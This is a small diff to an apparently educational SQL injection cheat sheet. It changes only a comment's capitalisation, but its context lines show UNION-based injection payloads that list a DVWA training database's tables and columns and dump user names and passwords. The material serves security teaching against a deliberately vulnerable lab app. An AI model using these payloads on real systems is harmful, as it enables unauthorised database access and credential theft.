@@ -261,7 +261,7 @@ reference: [https://pentestmonkey.net/category/cheat-sheet/sql-injection](https:
 ## Examining the database
 
 ~~~ sql
--- MYSQL
+-- MySQL
 UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_SCHEMA = 0x64767761# 0x64767761 = 'dvwa'
 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
 UNION SELECT USER, PASSWORD FROM USERS#
